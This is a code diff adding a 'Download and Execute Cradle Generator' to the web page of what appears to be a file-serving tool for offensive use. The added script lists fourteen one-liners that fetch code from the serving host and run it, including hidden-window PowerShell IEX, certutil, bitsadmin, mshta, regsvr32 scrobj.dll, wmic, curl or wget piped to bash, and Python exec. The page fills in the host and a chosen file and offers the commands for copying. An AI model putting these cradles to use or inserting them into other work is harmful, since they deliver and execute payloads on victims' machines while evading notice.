@@ -29,6 +29,7 @@
       <div class="upload-actions">
         <button id="selectAll" class="button">Select All</button>
         <button id="selectNone" class="button">Select None</button>
+             <button id="generateCradles" class="button">Generate Download and Execute</button>
         <label for="searchBox">Search:</label>
         <input type="text" id="searchBox" class="search" placeholder="Type to filter...">
       </div>
@@ -92,6 +93,11 @@
       </div>
       <div id="clipboardList" class="clipboard-list"></div>
     </section>
+    <br>
+      <section class="panel" id="cradlePanel" style="display:none;">
+    <h2>Download and Execute Cradle Generator</h2>
+    <div id="cradleList"></div>
+  </section>
   </main>
 
   <footer class="bottombar">
@@ -173,6 +179,94 @@
     });
 
     refreshClipboard();
+
+const cradles = [
+  {
+    caption: "PowerShell - Invoke-WebRequest + IEX",
+    command: `powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/FILENAME')"`
+  },
+  {
+    caption: "PowerShell - iwr + iex (short)",
+    command: `powershell -nop -w hidden -c "iwr -UseBasicParsing http://IP/FILENAME | iex"`
+  },
+  {
+    caption: "PowerShell - Download + Execute Local (two steps)",
+    command: `powershell -c "$f='FILENAME'; iwr http://IP/$f -OutFile $f; Start-Process $f"`
+  },
+  {
+    caption: "certutil - download EXE + execute",
+    command: `certutil -urlcache -split -f http://IP/FILENAME FILENAME && FILENAME`
+  },
+  {
+    caption: "bitsadmin - download EXE + execute",
+    command: `bitsadmin /transfer myjob /download /priority high http://IP/FILENAME FILENAME && FILENAME`
+  },
+  {
+    caption: "Invoke-Expression with DownloadFile",
+    command: `powershell -c "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://IP/FILENAME','FILENAME');Start-Process 'FILENAME'"`
+  },
+  {
+    caption: "mshta - run remote HTA/JS/VBS",
+    command: `mshta http://IP/FILENAME`
+  },
+  {
+    caption: "regsvr32 - SCT/DLL",
+    command: `regsvr32 /s /n /u /i:http://IP/FILENAME scrobj.dll`
+  },
+  {
+    caption: "wmic - run PowerShell cradle",
+    command: `wmic process call create "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP/FILENAME')"`
+  },
+  {
+    caption: "curl + bash (Linux)",
+    command: `curl -s http://IP/FILENAME | bash`
+  },
+  {
+    caption: "wget + bash (Linux)",
+    command: `wget -qO- http://IP/FILENAME | bash`
+  },
+  {
+    caption: "Python 3 (Linux)",
+    command: `python3 -c "import urllib.request; exec(urllib.request.urlopen('http://IP/FILENAME').read())"`
+  },
+  {
+    caption: "curl download + chmod + exec (Linux)",
+    command: `curl -o FILENAME http://IP/FILENAME && chmod +x FILENAME && ./FILENAME`
+  },
+  {
+    caption: "wget download + chmod + exec (Linux)",
+    command: `wget http://IP/FILENAME -O FILENAME && chmod +x FILENAME && ./FILENAME`
+  }
+];
+
+
+function generateCradles(filename) {
+  const ip = window.location.host;
+  const panel = document.getElementById('cradlePanel');
+  const list = document.getElementById('cradleList');
+  list.innerHTML = '';
+  cradles.forEach(c => {
+    const updated = c.command.replace(/http:\/\/IP\/?/g, `http://${ip}/files`).replace(/FILENAME/g, filename);
+    const box = document.createElement('div');
+    box.className = 'cradle-box';
+    box.innerHTML = `
+      <strong>${c.caption}</strong>
+      <button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextElementSibling.value)">Copy</button>
+      <textarea readonly rows="2">${updated}</textarea>
+    `;
+    list.appendChild(box);
+  });
+  panel.style.display = 'block';
+}
+
+// Add event listener to generate button
+let selectedFile = null;
+document.getElementById('generateCradles').addEventListener('click', () => {
+  const selected = document.querySelector('input[name="files"]:checked');
+  if (!selected) return alert("Select a file first");
+  selectedFile = selected.value.split("/").pop();
+  generateCradles(selectedFile);
+});
   </script>
 </body>
 </html>
